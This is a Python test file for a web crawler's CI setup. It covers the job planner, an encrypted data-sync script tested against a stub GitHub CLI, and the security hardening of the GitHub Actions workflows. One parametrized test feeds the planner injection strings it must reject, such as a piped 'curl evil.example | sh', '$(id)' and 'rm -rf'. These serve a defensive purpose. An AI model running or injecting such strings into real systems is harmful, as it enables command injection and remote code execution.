"""The CI plumbing: the run planner, the encrypted data script (against a stub `gh`), and the workflows' hardening."""
import json
import os
import re
import stat
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import ci_plan  # noqa: E402

CRONS = {"NIGHTLY_CRON": "23 5 * * *", "WEEKLY_CRON": "37 8 * * 6", "BACKFILL_CRON": "13 13 * * *"}


def _plan(tmp_path, **env):
    (tmp_path / "config").mkdir(exist_ok=True)
    return ci_plan.plan({**CRONS, **env}, root=tmp_path)


def test_plan_schedules_and_inputs(tmp_path):
    p = _plan(tmp_path, SCHEDULE=CRONS["NIGHTLY_CRON"])
    assert p["crawl"] and not p["research"] and not p["seed"] and p["n"] == 2 and p["shards"] == "[0, 1]"
    w = _plan(tmp_path, SCHEDULE=CRONS["WEEKLY_CRON"])
    assert w["weekly"] and w["seed"] and w["research"] and w["research_minutes"] == 13
    b = _plan(tmp_path, SCHEDULE=CRONS["BACKFILL_CRON"])
    assert b["backfill"] and b["skip"] and not b["crawl"]                    # backfill switched off by default
    m = _plan(tmp_path, IN_JOB="crawl", IN_SOURCE="example-org:site", IN_TIER="a", IN_FORCE="true", CRAWL_SHARDS="4")
    assert m["source"] == "example-org:site" and m["tier"] == "a" and m["force"] and m["n"] == 4
    s = _plan(tmp_path, IN_JOB="subjects")
    assert s["research"] and s["research_minutes"] == 90
    assert not _plan(tmp_path, IN_JOB="export-only")["crawl"]


@pytest.mark.parametrize("env", [
    {"IN_SOURCE": "x; curl evil.example | sh"}, {"IN_SOURCE": "$(id)"}, {"IN_SOURCE": "a\nb"}, {"IN_TIER": "z"},
    {"IN_JOB": "rm -rf"}, {"CRAWL_SHARDS": "2; echo"}, {"CRAWL_SHARDS": "999"}, {"IN_FORCE": "yes please"},
])
def test_plan_rejects_bad_values(tmp_path, env):
    with pytest.raises(ci_plan.PlanError):
        _plan(tmp_path, **env)


def test_plan_writes_github_output(tmp_path, monkeypatch, capsys):
    out = tmp_path / "out.txt"
    monkeypatch.chdir(tmp_path)
    for k, v in {**CRONS, "SCHEDULE": CRONS["NIGHTLY_CRON"], "GITHUB_OUTPUT": str(out), "OPENCRAWL_ROOT": str(tmp_path)}.items():
        monkeypatch.setenv(k, v)
    assert ci_plan.main() == 0
    lines = dict(ln.split("=", 1) for ln in out.read_text().splitlines())
    assert lines["crawl"] == "true" and lines["n"] == "2"
    monkeypatch.setenv("IN_SOURCE", "bad source")
    assert ci_plan.main() == 1


# ----------------------------------------------------------------------------- ci_data.sh with a stub gh
STUB_GH = r"""#!/usr/bin/env bash
# a stand-in for the GitHub CLI: release assets live in $GH_STUB_DIR/<tag>/
set -e
R="$GH_STUB_DIR"
if [ "$1 $2" = "release view" ]; then
  [ -n "$GH_STUB_FAIL" ] && { echo "HTTP 502: bad gateway" >&2; exit 1; }
  [ -d "$R/$3" ] || { echo "release not found" >&2; exit 1; }
  if [ "$4" = "--json" ]; then ls "$R/$3"; fi
  exit 0
fi
if [ "$1 $2" = "release create" ]; then mkdir -p "$R/$3"; exit 0; fi
if [ "$1 $2" = "release upload" ]; then tag="$3"; shift 3; for f in "$@"; do [ "$f" = "--clobber" ] || cp "$f" "$R/$tag/"; done; exit 0; fi
if [ "$1 $2" = "release download" ]; then
  tag="$3"; shift 3; pat=""; dir="."
  while [ $# -gt 0 ]; do case "$1" in -p) pat="$2"; shift 2;; -D) dir="$2"; shift 2;; *) shift;; esac; done
  [ -f "$R/$tag/$pat" ] || exit 1
  mkdir -p "$dir"; cp "$R/$tag/$pat" "$dir/"; exit 0
fi
echo "stub gh: unsupported $*" >&2; exit 2
"""


@pytest.fixture
def ci_env(tmp_path):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    gh = bin_dir / "gh"
    gh.write_text(STUB_GH)
    gh.chmod(gh.stat().st_mode | stat.S_IEXEC)
    work = tmp_path / "work"
    work.mkdir()
    from opencrawl import vault

    env = {**os.environ, "PATH": f"{bin_dir}:{os.environ['PATH']}", "GH_STUB_DIR": str(tmp_path / "releases"),
           "PYTHONPATH": str(ROOT), "PYTHON": sys.executable, "OPENCRAWL_DATA_KEY": vault.keygen()}
    (tmp_path / "releases").mkdir()
    return work, env


def _sh(work, env, *args, check=True):
    return subprocess.run(["bash", str(ROOT / "scripts" / "ci_data.sh"), *args], cwd=work, env=env, capture_output=True,
                          text=True, check=check, timeout=120)


def test_ci_data_roundtrip_through_a_release(ci_env, tmp_path):
    work, env = ci_env
    assert "first run" in _sh(work, env, "pull").stdout
    from opencrawl.store import Record, Store

    s = Store(work / "data")
    s.add(Record("t:site", "page", "https://example.org/", title="Hello", text="SECRETPAGETEXT"))
    s.close()
    (work / "state" / "http_cache").mkdir(parents=True)
    (work / "state" / "http_cache" / "x.body").write_text("cached copy")
    (work / "state" / "progress.json").write_text('{"t:site": {"status": "ok"}}')
    _sh(work, env, "pack", "opencrawl-data.ocv")
    sealed = (work / "opencrawl-data.ocv").read_bytes()
    assert b"SECRETPAGETEXT" not in sealed and sealed.startswith(b"OCVAULT1")
    _sh(work, env, "push", "opencrawl-data.ocv")
    fresh = tmp_path / "fresh"
    fresh.mkdir()
    out = _sh(fresh, env, "pull").stdout
    assert "restored" in out
    assert Store(fresh / "data").search(Store.fts_phrase("SECRETPAGETEXT"))
    assert json.loads((fresh / "state" / "progress.json").read_text())["t:site"]["status"] == "ok"
    assert not (fresh / "state" / "http_cache").exists()                 # the page cache never leaves the runner
    # artifacts between jobs: seal / open
    (work / "out" / "deltas").mkdir(parents=True)
    (work / "out" / "deltas" / "shard-0.db").write_bytes(b"delta")
    _sh(work, env, "seal", "out", "shard-0.ocv")
    _sh(work, env, "open", "shard-0.ocv", str(tmp_path / "opened"))
    assert (tmp_path / "opened" / "out" / "deltas" / "shard-0.db").read_bytes() == b"delta"


def test_ci_data_refuses_without_a_key(ci_env):
    work, env = ci_env
    env = {k: v for k, v in env.items() if k != "OPENCRAWL_DATA_KEY"}
    r = _sh(work, env, "pack", "x.ocv", check=False)
    assert r.returncode == 1 and "OPENCRAWL_DATA_KEY" in r.stderr and not (work / "x.ocv").exists()


def test_ci_data_never_replaces_data_it_could_not_read(ci_env, tmp_path):
    work, env = ci_env
    r = _sh(work, env, "pack", "x.ocv", check=False)                  # nothing restored in this job yet
    assert r.returncode == 1 and "refusing" in r.stderr and not (work / "x.ocv").exists()
    r = _sh(work, {**env, "GH_STUB_FAIL": "1"}, "pull", check=False)    # the release can't be read: stop, don't pretend
    assert r.returncode == 1 and not (work / ".ci-restored").exists()
    _sh(work, env, "pull")                                              # first run: fine
    (work / "data").mkdir(exist_ok=True)
    (work / "data" / "note.txt").write_text("x")
    _sh(work, env, "pack", "opencrawl-data.ocv")
    _sh(work, env, "push", "opencrawl-data.ocv")
    other = tmp_path / "other"
    other.mkdir()
    from opencrawl import vault

    r = _sh(other, {**env, "OPENCRAWL_DATA_KEY": vault.keygen()}, "pull", check=False)   # wrong key
    assert r.returncode != 0 and not (other / ".ci-restored").exists()


# ----------------------------------------------------------------------------- the workflows
def _workflows():
    return {p.name: (p.read_text(), yaml.safe_load(p.read_text())) for p in (ROOT / ".github" / "workflows").glob("*.yml")}


def test_actions_are_pinned_and_jobs_least_privileged():
    for name, (text, wf) in _workflows().items():
        for m in re.finditer(r"uses:\s*([^\s#]+)", text):
            ref = m.group(1)
            assert re.fullmatch(r"[\w.-]+/[\w.-]+@[0-9a-f]{40}", ref), f"{name}: {ref} is not pinned to a commit"
        top = wf.get("permissions")
        assert top in ({}, {"contents": "read"}), f"{name}: workflow-wide permissions must be empty or read-only"
        for jname, job in wf["jobs"].items():
            if top == {}:
                assert "permissions" in job, f"{name}/{jname}: no permissions block"
            writes = [k for k, v in (job.get("permissions") or {}).items() if v == "write"]
            if writes:
                assert jname == "publish", f"{name}/{jname} has write permissions"
            for step in job.get("steps", []):
                if "actions/checkout" in step.get("uses", "") and jname != "publish":
                    assert step.get("with", {}).get("persist-credentials") is False, f"{name}/{jname}: credentials persisted"


def test_no_untrusted_expressions_inside_scripts():
    """Inputs, variables, secrets and event fields reach scripts only through env: never pasted into a run block."""
    for name, (_, wf) in _workflows().items():
        for jname, job in wf["jobs"].items():
            for step in job.get("steps", []):
                run = step.get("run") or ""
                bad = re.findall(r"\$\{\{\s*(inputs|vars|secrets|github\.event|needs|matrix|steps)[^}]*\}\}", run)
                assert not bad, f"{name}/{jname}/{step.get('name')}: expression in script: {bad}"


def test_crawl_workflow_is_opt_in_and_keeps_secrets_scoped():
    text, wf = _workflows()["crawl.yml"]
    assert wf["jobs"]["prepare"]["if"] == "vars.OPENCRAWL_ENABLED == 'true'"
    assert "GH_TOKEN" not in (wf.get("env") or {}) and "OPENCRAWL_DATA_KEY" not in (wf.get("env") or {})
    for jname, job in wf["jobs"].items():
        for step in job.get("steps", []):
            env = step.get("env") or {}
            if any(k.startswith("ORR_") for k in env):
                assert "records" in step.get("name", "").lower(), f"mailbox secrets outside the records step: {step.get('name')}"
            if "run" in step and "opencrawl run" in step["run"]:
                assert "stop-commands" in step["run"], "crawled text printed with workflow commands enabled"
    crons = [c["cron"] for c in wf[True]["schedule"]] if True in wf else [c["cron"] for c in wf["on"]["schedule"]]
    assert set(crons) == {"23 5 * * *", "37 8 * * 6", "13 13 * * *"}
    assert {wf["env"]["NIGHTLY_CRON"], wf["env"]["WEEKLY_CRON"], wf["env"]["BACKFILL_CRON"]} == set(crons)
